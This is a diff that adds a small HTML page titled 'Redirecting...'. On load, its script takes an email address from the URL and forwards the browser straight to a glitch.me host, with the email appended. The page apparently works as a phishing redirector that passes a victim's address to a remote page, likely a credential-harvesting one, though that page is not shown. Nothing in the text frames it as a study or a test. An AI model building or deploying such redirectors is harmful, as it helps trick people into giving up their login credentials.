@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
+  <script nonce="MTcyOTY1MTMwNywyOTU0NDA1ODcx">
+    document.addEventListener('DOMContentLoaded', function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      let email = urlParams.get('email');
+
+      if (email) {
+        email = decodeURIComponent(email);
+        // Redirect immediately
+        window.location.href = 'https://peat-mixolydian-reindeer.glitch.me#/' + email;
+      } else {
+        document.body.innerHTML = '<p style="font-family: Arial; text-align:center; margin-top: 50px;">Missing email parameter. Redirect failed.</p>';
+      }
+    });
+  </script>
+</head>
+<body>
+</body>
+</html>
